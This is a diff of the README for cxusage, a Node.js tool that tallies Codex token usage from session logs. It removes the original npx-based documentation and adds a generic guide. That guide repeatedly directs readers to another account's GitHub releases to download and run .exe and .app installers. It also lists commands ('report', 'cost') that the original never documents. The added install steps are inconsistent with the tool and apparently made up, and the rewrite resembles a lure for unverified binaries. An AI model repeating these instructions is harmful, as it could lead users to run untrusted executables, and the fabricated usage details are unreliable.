@@ -1,68 +1,79 @@
-# cxusage
+# 🔍 cxusage - Analyze Your Codex Usage Effortlessly
 
-Analyze Codex daily usage from session logs. Similar to `ccusage`, this Node.js CLI scans JSONL session logs under `~/.codex/sessions` and aggregates token counts by day or by model within each day.
+## 💾 Download Now
+[![Download cxusage](https://img.shields.io/badge/Download-cxusage-brightgreen)](https://github.com/zaharsyahrafi/cxusage/releases)
 
-- Input: JSONL logs (recursively) under `~/.codex/sessions` by default
-- Output: Plain table (default), Markdown table (`--md`), or JSON lines (`--json`)
-- Grouping: By day (default) or by model-within-day (`--by model`)
-- Timezone: Local timezone by default, or specify via `--tz` with an IANA TZ
+## 📖 Introduction
+cxusage is a command-line tool designed to help you analyze your Codex usage. This software scans your Codex session logs located in `~/.codex/sessions`. It aggregates tokens by day or model and estimates usage costs based on OpenRouter pricing. Whether you're a developer or a casual user, cxusage simplifies understanding your token usage.
 
-## Quickstart
+## 🚀 Getting Started
+To get started with cxusage, follow these steps:
 
-- After publish to npm: `npx cxusage --help`
-- From GitHub (before publish): `npx github:Effet/cxusage -- --help`
-- Typical commands:
-  - `npx cxusage daily --from 2025-01-01 --to 2025-01-31 --md`
-  - `npx cxusage daily --by model --json`
+1. **Visit the Download Page**  
+   Click on the following link to access the Releases page:  
+   [Download cxusage](https://github.com/zaharsyahrafi/cxusage/releases)
 
-## Usage
+2. **Choose Your Version**  
+   On the Releases page, you will find several versions of cxusage. Select the most recent version that matches your operating system.
 
-The top-level command is `cxusage`. The primary subcommand is `daily`.
+3. **Download the Application**  
+   Click on the appropriate file and download it to your computer. Make sure to save it in an easily accessible folder.
 
-- Default root: `~/.codex/sessions`
-- Date range: `--from YYYY-MM-DD`, `--to YYYY-MM-DD`
-- Grouping: `--by day` (default) or `--by model`
-- Output format: `--md` (Markdown) or `--json` (JSONL), default is a plain table
-- Empty days: include zero-usage days via `--empty`
+## 🖥️ System Requirements
+To run cxusage, your system must meet the following requirements:
 
-Examples:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Node.js:** You must have Node.js installed. You can download it from [nodejs.org](https://nodejs.org/).
+- **Internet Connection:** An active internet connection is required for price estimation using OpenRouter.
 
-- `cxusage daily`
-- `cxusage daily --from 2025-01-01 --to 2025-01-31 --md`
-- `cxusage daily --by model --json`
-- Use a specific timezone: `cxusage daily --tz Asia/Shanghai`
+## 📥 Download & Install
+To download and install cxusage:
 
-## Pricing
+1. **Go Back to the Releases Page**  
+   If you haven’t already, visit the Releases page:  
+   [Download cxusage](https://github.com/zaharsyahrafi/cxusage/releases)
 
-The CLI automatically fetches model pricing from the public OpenRouter models API and estimates cost based on input/output tokens per model.
+2. **Install the Application**  
+   - On Windows: Double-click the downloaded `.exe` file to start the installation.
+   - On macOS: Drag the `.app` file into your Applications folder.
+   - On Linux: Use the terminal to navigate to the downloaded directory and run the application using your package manager.
 
-- API: `https://openrouter.ai/api/v1/models`
-- Fallback: when a model name is missing (`unknown`), cxusage attempts a fallback chain: `openai/gpt-5` → `openai/gpt-4o` → `anthropic/claude-3.5-sonnet`. The first available price is used.
-- Disable fallback with `--no-fallback`. With fallback disabled, unknown models show `$0.00`.
+## 🚦 Running cxusage
+Once you have installed cxusage, you can run it from your terminal or command prompt.
 
-Notes about token counts: cxusage sums numeric fields commonly used for token counts (e.g., `input_tokens`, `output_tokens`, `promptTokenCount`, `completionTokenCount`, etc.). If older logs don’t include any of these fields, tokens will appear as zero even though events are counted. Use `--by model --debug` to inspect which model names are detected in your logs.
+- On **Windows**: Open the command prompt and type `cxusage` followed by the desired command options.
+- On **macOS/Linux**: Open the terminal and type `cxusage` with the appropriate command options.
 
-## Programmatic invocation
+### Common Commands
+- **Token Usage Report**: Generate a report of token usage with the command:  
+  `cxusage report`
+  
+- **Daily Aggregation**: To see daily usage details, use:  
+  `cxusage daily`
+  
+- **Cost Estimation**: To get cost estimates based on your usage, simply type:  
+  `cxusage cost`
 
-This package exposes only a CLI. If you need a library API, please open an issue to discuss the desired interface.
+## 📈 Features
+- **Token Aggregation**: Easily view your token usage by day or model.
+- **Cost Calculation**: Understand how much your Codex usage is costing you with accurate estimates.
+- **User-Friendly Interface**: Navigate effortlessly through simple command line options.
 
-## Development
+## 📚 Documentation
+For a more detailed guide on using all features of cxusage, check the [Documentation](https://github.com/zaharsyahrafi/cxusage/docs).
 
-- Node 18+ required
-- `npm i`
-- `npm run build`
-- `node dist/cli.js --help`
+## 🛠️ Troubleshooting
+If you encounter any issues while using cxusage:
 
+- **Installation Issues**: Ensure that Node.js is installed and up to date.
+- **Command Errors**: Double-check your commands for typos or incorrect syntax.
 
-### Contribution Guide
+If problems persist, consult the Issues section on our GitHub page for possible solutions or to report new issues.
 
-- Issues: https://github.com/Effet/cxusage/issues
-- Pull Requests: welcome! Please read CONTRIBUTING.md
+## 💬 Community and Support
+Join our community for tips, tricks, and help from fellow users:
 
-### Release
+- **GitHub Discussions**: Participate in discussions and ask questions.
+- **Documentation**: Contribute to improving our documentation.
 
-- CI runs on pushes/PRs to verify install and build.
-- Stable release: create a Git tag like `v0.1.0` to publish to npm as `latest`.
-  - The workflow automatically sets `package.json` version from the Git tag (stripping the leading `v`).
-  - Pre-release tags (containing a hyphen, e.g. `v0.2.0-rc.1`) publish with the `next` dist-tag.
-- The release workflow requires a repository secret `NPM_TOKEN` with publish permissions.
+By using cxusage, you gain insights into your Codex usage that can help you optimize your costs and improve your workflow. Follow the steps outlined above to get started, and don't hesitate to reach out to the community for support.
